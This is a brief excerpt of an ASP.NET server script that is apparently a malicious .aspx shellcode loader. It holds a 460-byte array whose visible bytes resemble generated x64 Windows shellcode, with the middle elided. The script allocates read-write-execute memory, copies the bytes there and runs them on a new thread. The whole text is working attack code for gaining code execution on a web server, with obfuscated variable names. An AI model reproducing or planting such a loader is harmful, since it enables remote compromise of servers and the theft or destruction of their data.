...
<script runat="server">
    ...
    {
        byte[] kyeyLnV2QaL = new byte[460] {0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,
...
0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5};
        ...
        IntPtr e_pg = VirtualAlloc(IntPtr.Zero,(UIntPtr)kyeyLnV2QaL.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        System.Runtime.InteropServices.Marshal.Copy(kyeyLnV2QaL,0,e_pg,kyeyLnV2QaL.Length);
        IntPtr xc42Weni = IntPtr.Zero;
        IntPtr ygaNV = CreateThread(IntPtr.Zero,UIntPtr.Zero,e_pg,IntPtr.Zero,0,ref xc42Weni);
    }
</script>
